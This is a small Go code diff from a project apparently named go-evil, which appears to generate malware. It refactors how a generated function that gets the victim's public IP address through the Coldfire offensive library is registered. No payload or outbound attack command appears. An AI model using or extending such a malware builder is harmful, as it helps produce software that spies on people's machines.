@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
 )
 
 // Get the global ip address
@@ -12,10 +13,11 @@ func Get_global(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "get_global_ip"
 
-	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(){", function_call),
-		"spine.variable.set(coldfire.GetGlobalIp())",
-		"}"})
+	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
+		Parameters: []string{""},
+		Gut: []string{
+			"spine.variable.set(coldfire.GetGlobalIp())",
+		}})
 
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
